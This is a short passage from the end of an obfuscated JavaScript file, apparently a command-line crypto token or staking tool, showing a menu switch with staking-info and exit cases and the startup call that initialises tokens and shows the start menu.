            if (_0x107b30) showStakingInfo();
            break;
        case 'exit':
            console[_0x325458(0x21d)](chalk[_0x325458(0x284)](_0x325458(0x264))), process[_0x325458(0x1e5)](0x0);
    }
}((async () => {
    await initializeTokens(), showStartMenu();
})());